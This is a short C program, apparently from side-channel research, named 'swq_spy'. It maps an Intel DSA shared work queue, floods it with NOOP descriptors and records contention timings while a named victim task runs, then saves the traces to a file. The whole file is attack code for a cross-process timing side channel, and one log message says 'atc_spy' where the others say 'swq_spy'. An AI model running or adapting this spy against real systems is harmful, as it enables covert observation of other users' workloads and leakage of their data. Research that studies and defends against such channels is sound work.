#include "dsa.h"

#define ATTACK_INTERVAL_NS 100
#define TRACE_BUFFER_SIZE 10000

struct wq_info wq_info;
struct dsa_hw_desc desc = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {};
uint64_t detection_threshold;
uint8_t *src, *dst;

// traces
uint64_t trace_buffer[TRACE_BUFFER_SIZE];
int trace_index = 0;

// Save traces to file
void save_traces(char* taskname) {
    char filename[256];
    snprintf(filename, sizeof(filename), "swq_%s_traces.txt", taskname);

    FILE* fp = fopen(filename, "w");
    if (!fp) {
        fprintf(stderr, "[swq_spy] Failed to open trace file\n");
        return;
    }
    
    for (int i = 0; i < trace_index; i++) {
        fprintf(fp, "%lu\n", trace_buffer[i]);
    }
    
    fclose(fp);
    printf("[swq_spy] Traces saved to %s\n", filename);
}

int main(int argc, char *argv[]) {
    char *taskname;
    if (argc == 2) {
        taskname = argv[1];
    } else {
        printf("Usage: %s [prog-to-spy]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq2.0");
    if (rc) {
        fprintf(stderr, "[swq_spy] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    // Prepare NOOP descriptor
    desc.opcode = DSA_OPCODE_NOOP;
    
    printf("[atc_spy] Spying on task: %s\n", taskname);

    while (trace_index < TRACE_BUFFER_SIZE) {
        congest(&comp);
        nsleep(1);
        trace_buffer[trace_index++] = probe_swq(&comp);
    }
    
    save_traces(taskname);

    return EXIT_SUCCESS;
}
